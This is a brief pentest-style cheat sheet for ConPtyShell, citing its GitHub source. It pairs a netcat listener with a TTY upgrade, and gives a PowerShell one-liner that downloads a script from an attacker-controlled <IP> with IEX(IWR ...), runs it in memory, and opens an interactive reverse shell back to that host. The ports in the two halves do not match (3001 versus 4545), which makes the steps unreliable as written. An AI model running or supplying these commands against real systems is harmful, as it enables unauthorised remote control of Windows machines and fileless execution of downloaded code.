#[ source: https://github.com/antonioCoco/ConPtyShell ]
-----
[server]
stty size
nc -lvnp 3001
Wait For connection
ctrl+z
stty raw -echo; fg[ENTER]

[client]
IEX(IWR http://<IP>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp <IP> -RemotePort 4545 -Rows 45 -Cols 173

